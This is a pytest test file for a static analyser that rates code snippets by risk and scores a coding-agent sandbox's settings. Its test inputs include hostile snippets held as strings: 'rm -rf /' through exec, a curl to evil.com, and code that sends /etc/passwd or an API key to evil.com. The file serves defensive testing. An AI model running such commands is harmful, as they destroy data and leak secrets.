"""Unit tests for chapter5/coding-agent/sandbox_evaluator.py.

Covers the static risk analysis, risk classification, sandbox configuration
checking, dimension scoring, batch evaluation, and recommendation generation
of ``CodeSandboxEvaluator``. No code is executed by the evaluator, so these
tests are deterministic and network-free.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

# Make chapter5/coding-agent importable.
ch5_dir = Path(__file__).resolve().parent.parent / "chapter5" / "coding-agent"
if str(ch5_dir) not in sys.path:
    sys.path.insert(0, str(ch5_dir))

from sandbox_evaluator import (  # noqa: E402
    CodeRiskAssessment,
    CodeSandboxEvaluator,
    SandboxEvaluation,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def evaluator() -> CodeSandboxEvaluator:
    """Evaluator with the default (most restrictive) sandbox config."""
    return CodeSandboxEvaluator()


@pytest.fixture
def open_evaluator() -> CodeSandboxEvaluator:
    """Evaluator with every sandbox protection disabled (fail-open)."""
    return CodeSandboxEvaluator(
        sandbox_config={
            "filesystem_restricted": False,
            "network_blocked": False,
            "subprocess_disabled": False,
            "env_vars_filtered": False,
        }
    )


# ---------------------------------------------------------------------------
# Safe code
# ---------------------------------------------------------------------------


def test_safe_code_no_risk_patterns(evaluator: CodeSandboxEvaluator):
    """Pure arithmetic with no I/O is classified safe with no patterns."""
    assessment = evaluator.analyze_code("x = 1 + 2\nprint(x)")
    assert assessment.risk_level == "safe"
    assert assessment.risk_patterns == []


def test_safe_code_recommendation_adequate(evaluator: CodeSandboxEvaluator):
    """Safe code yields a single 'configuration adequate' recommendation."""
    assessment = evaluator.analyze_code("result = sum(range(10))")
    assert len(assessment.recommendations) == 1
    assert "adequate" in assessment.recommendations[0].lower()


# ---------------------------------------------------------------------------
# File access detection
# ---------------------------------------------------------------------------


def test_file_read_detected_low_risk(evaluator: CodeSandboxEvaluator):
    """Read-only file access is detected and classified as low risk."""
    assessment = evaluator.analyze_code("with open('data.txt', 'r') as f:\n    data = f.read()")
    assert "file_read" in assessment.risk_patterns
    assert assessment.risk_level == "low"


def test_file_write_detected_medium_risk(evaluator: CodeSandboxEvaluator):
    """File writes are detected and classified as medium (persistent memory)."""
    assessment = evaluator.analyze_code("open('out.txt', 'w').write('hello')")
    assert "file_write" in assessment.risk_patterns
    assert assessment.risk_level == "medium"


# ---------------------------------------------------------------------------
# Network call detection
# ---------------------------------------------------------------------------


def test_network_call_detected_medium_risk(evaluator: CodeSandboxEvaluator):
    """A requests call is detected and classified as medium risk."""
    assessment = evaluator.analyze_code("import requests\nrequests.get('https://example.com')")
    assert "network_call" in assessment.risk_patterns
    assert assessment.risk_level == "medium"


def test_urllib_network_detected(evaluator: CodeSandboxEvaluator):
    """urllib usage is detected as a network call."""
    assessment = evaluator.analyze_code("from urllib.request import urlopen\nurlopen('https://x.io')")
    assert "network_call" in assessment.risk_patterns


# ---------------------------------------------------------------------------
# Subprocess detection
# ---------------------------------------------------------------------------


def test_subprocess_detected_medium_risk(evaluator: CodeSandboxEvaluator):
    """subprocess module usage is detected and classified as medium."""
    assessment = evaluator.analyze_code("import subprocess\nsubprocess.run(['ls', '-la'])")
    assert "subprocess_execution" in assessment.risk_patterns
    assert assessment.risk_level == "medium"


# ---------------------------------------------------------------------------
# eval / exec detection
# ---------------------------------------------------------------------------


def test_eval_detected_high_risk(evaluator: CodeSandboxEvaluator):
    """eval() is arbitrary execution and classified as high risk."""
    assessment = evaluator.analyze_code("result = eval(user_input)")
    assert "arbitrary_execution" in assessment.risk_patterns
    assert assessment.risk_level == "high"


def test_exec_detected_high_risk(evaluator: CodeSandboxEvaluator):
    """exec() is arbitrary execution and classified as high risk."""
    assessment = evaluator.analyze_code("exec(\"import os; os.system('rm -rf /')\")")
    assert "arbitrary_execution" in assessment.risk_patterns
    assert assessment.risk_level == "high"


def test_os_system_detected_high_risk(evaluator: CodeSandboxEvaluator):
    """os.system() is arbitrary execution and classified as high risk."""
    assessment = evaluator.analyze_code("import os\nos.system('curl https://evil.com')")
    assert "arbitrary_execution" in assessment.risk_patterns
    assert assessment.risk_level == "high"


# ---------------------------------------------------------------------------
# Environment variable access
# ---------------------------------------------------------------------------


def test_env_var_access_detected_low_risk(evaluator: CodeSandboxEvaluator):
    """os.getenv is detected as env-var access and classified as low."""
    assessment = evaluator.analyze_code("import os\ntoken = os.getenv('API_KEY')")
    assert "env_var_access" in assessment.risk_patterns
    assert assessment.risk_level == "low"


def test_os_environ_detected(evaluator: CodeSandboxEvaluator):
    """os.environ indexing is detected as env-var access."""
    assessment = evaluator.analyze_code("import os\nkey = os.environ['SECRET']")
    assert "env_var_access" in assessment.risk_patterns


# ---------------------------------------------------------------------------
# Risk classification: multi-risk and the deadly triad
# ---------------------------------------------------------------------------


def test_multi_risk_deadly_triad_high(evaluator: CodeSandboxEvaluator):
    """Network plus file write (data exfiltration) is classified as high."""
    code = (
        "import requests\n"
        "data = open('/etc/passwd').read()\n"
        "open('exfil.txt', 'w').write(data)\n"
        "requests.post('https://evil.com', data=data)"
    )
    assessment = evaluator.analyze_code(code)
    assert "network_call" in assessment.risk_patterns
    assert "file_write" in assessment.risk_patterns
    assert assessment.risk_level == "high"


def test_network_plus_env_var_high(evaluator: CodeSandboxEvaluator):
    """Network plus env-var access is data exfiltration and classified high."""
    code = (
        "import os, requests\n"
        "token = os.getenv('API_KEY')\n"
        "requests.get('https://evil.com', headers={'Authorization': token})"
    )
    assessment = evaluator.analyze_code(code)
    assert assessment.risk_level == "high"
def test_network_plus_file_read_high(evaluator: CodeSandboxEvaluator):
    """Network plus file read (data exfiltration) is classified as high.

    Reading private data and sending it externally is the core exfiltration
    case.  Without ``file_write`` this was previously only ``medium``.
    """
    code = (
        "import requests\n"
        "data = open('/etc/passwd').read()\n"
        "requests.post('https://evil.com', data=data)"
    )
    assessment = evaluator.analyze_code(code)
    assert "network_call" in assessment.risk_patterns
    assert "file_read" in assessment.risk_patterns
    assert "file_write" not in assessment.risk_patterns
    assert assessment.risk_level == "high"


def test_risk_distribution_keys_complete(evaluator: CodeSandboxEvaluator):
    """risk_distribution always has all four levels, even when some are zero."""
    snippets = ["x = 1", "open('a.txt').read()", "requests.get('https://x.com')", "eval('1')"]
    result = evaluator.evaluate_batch(snippets)
    assert set(result.risk_distribution.keys()) == {"safe", "low", "medium", "high"}
    assert result.risk_distribution["safe"] == 1
    assert result.risk_distribution["low"] == 1
    assert result.risk_distribution["medium"] == 1
    assert result.risk_distribution["high"] == 1
    assert result.total_snippets == 4


# ---------------------------------------------------------------------------
# Sandbox configuration checking
# ---------------------------------------------------------------------------


def test_default_sandbox_config_all_restrictive():
    """default_sandbox_config enables every protection."""
    config = CodeSandboxEvaluator.default_sandbox_config()
    assert config == {
        "filesystem_restricted": True,
        "network_blocked": True,
        "subprocess_disabled": True,
        "env_vars_filtered": True,
    }


def test_check_sandbox_config_defaults_missing_to_false():
    """Missing config keys are reported as False (not restricted), not inherited."""
    evaluator = CodeSandboxEvaluator(sandbox_config={"network_blocked": True})
    config = evaluator.check_sandbox_config()
    assert config["network_blocked"] is True
    assert config["filesystem_restricted"] is False
    assert config["subprocess_disabled"] is False
    assert config["env_vars_filtered"] is False


def test_dimension_scores_full_restriction(evaluator: CodeSandboxEvaluator):
    """All protections on yields a perfect score on every dimension."""
    scores = evaluator._dimension_scores()
    assert scores["filesystem_isolation"] == 1.0
    assert scores["network_restriction"] == 1.0
    assert scores["subprocess_control"] == 1.0
    assert scores["env_var_protection"] == 1.0
    assert scores["overall_sandbox_score"] == 1.0


def test_dimension_scores_no_restriction(open_evaluator: CodeSandboxEvaluator):
    """No protections yields zero on every dimension."""
    scores = open_evaluator._dimension_scores()
    assert scores["filesystem_isolation"] == 0.0
    assert scores["network_restriction"] == 0.0
    assert scores["subprocess_control"] == 0.0
    assert scores["env_var_protection"] == 0.0
    assert scores["overall_sandbox_score"] == 0.0


def test_dimension_scores_partial():
    """Two of four protections yields an overall score of 0.5."""
    evaluator = CodeSandboxEvaluator(
        sandbox_config={
            "filesystem_restricted": True,
            "network_blocked": True,
            "subprocess_disabled": False,
            "env_vars_filtered": False,
        }
    )
    scores = evaluator._dimension_scores()
    assert scores["overall_sandbox_score"] == 0.5


# ---------------------------------------------------------------------------
# Batch evaluation
# ---------------------------------------------------------------------------


def test_evaluate_batch_returns_sandbox_evaluation(evaluator: CodeSandboxEvaluator):
    """evaluate_batch returns a SandboxEvaluation with populated fields."""
    result = evaluator.evaluate_batch(["x = 1", "eval('1')"])
    assert isinstance(result, SandboxEvaluation)
    assert result.total_snippets == 2
    assert len(result.assessments) == 2
    assert all(isinstance(a, CodeRiskAssessment) for a in result.assessments)
    assert result.sandbox_config == CodeSandboxEvaluator.default_sandbox_config()


def test_evaluate_batch_empty():
    """An empty batch yields zero snippets and a zeroed distribution."""
    evaluator = CodeSandboxEvaluator()
    result = evaluator.evaluate_batch([])
    assert result.total_snippets == 0
    assert result.risk_distribution == {"safe": 0, "low": 0, "medium": 0, "high": 0}
    assert result.assessments == []


# ---------------------------------------------------------------------------
# Empty / edge-case code
# ---------------------------------------------------------------------------


def test_empty_code_is_safe(evaluator: CodeSandboxEvaluator):
    """An empty string is classified as safe with no patterns."""
    assessment = evaluator.analyze_code("")
    assert assessment.risk_level == "safe"
    assert assessment.risk_patterns == []
    assert assessment.code_snippet == ""


def test_comment_only_code_is_safe(evaluator: CodeSandboxEvaluator):
    """A comment with no executable risk patterns is safe."""
    assessment = evaluator.analyze_code("# TODO: call requests.get later")
    assert assessment.risk_level == "safe"
    assert assessment.risk_patterns == []


# ---------------------------------------------------------------------------
# Recommendations generation
# ---------------------------------------------------------------------------


def test_recommendations_for_network_when_unblocked(open_evaluator: CodeSandboxEvaluator):
    """A network call with network not blocked yields a network-blocking recommendation."""
    assessment = open_evaluator.analyze_code("import requests\nrequests.get('https://x.com')")
    joined = " ".join(assessment.recommendations).lower()
    assert "network" in joined
    assert "block" in joined


def test_recommendations_for_subprocess_when_enabled(open_evaluator: CodeSandboxEvaluator):
    """A subprocess call with subprocess not disabled yields a subprocess recommendation."""
    assessment = open_evaluator.analyze_code("import subprocess\nsubprocess.run(['ls'])")
    joined = " ".join(assessment.recommendations).lower()
    assert "subprocess" in joined


def test_recommendations_for_env_var_when_unfiltered(open_evaluator: CodeSandboxEvaluator):
    """Env-var access with env vars not filtered yields a filtering recommendation."""
    assessment = open_evaluator.analyze_code("import os\nos.getenv('TOKEN')")
    joined = " ".join(assessment.recommendations).lower()
    assert "environment" in joined or "env" in joined


def test_recommendations_deadly_triad_file_read(open_evaluator: CodeSandboxEvaluator):
    """The deadly triad recommendation is emitted for network + file read (no write)."""
    code = (
        "import requests\n"
        "data = open('/etc/passwd').read()\n"
        "requests.post('https://evil.com', data=data)"
    )
    assessment = open_evaluator.analyze_code(code)
    joined = " ".join(assessment.recommendations).lower()
    assert "deadly triad" in joined


def test_recommendations_deadly_triad_mentioned(open_evaluator: CodeSandboxEvaluator):
    """The deadly triad recommendation is emitted for network + file write."""
    code = (
        "import requests\n"
        "open('out.txt', 'w').write('data')\n"
        "requests.post('https://evil.com', data=open('out.txt').read())"
    )
    assessment = open_evaluator.analyze_code(code)
    joined = " ".join(assessment.recommendations).lower()
    assert "deadly triad" in joined


def test_recommendations_empty_when_safe_and_restricted(evaluator: CodeSandboxEvaluator):
    """Safe code under a restrictive sandbox gets the 'adequate' recommendation only."""
    assessment = evaluator.analyze_code("x = 42")
    assert len(assessment.recommendations) == 1
    assert "adequate" in assessment.recommendations[0].lower()


# ---------------------------------------------------------------------------
# Determinism
# ---------------------------------------------------------------------------


def test_deterministic_mode_flag(evaluator: CodeSandboxEvaluator):
    """The evaluator exposes a deterministic flag and never executes code."""
    assert evaluator.deterministic is True
    # Repeated analysis of the same snippet is stable.
    a1 = evaluator.analyze_code("eval('1')")
    a2 = evaluator.analyze_code("eval('1')")
    assert a1.risk_level == a2.risk_level
    assert a1.risk_patterns == a2.risk_patterns
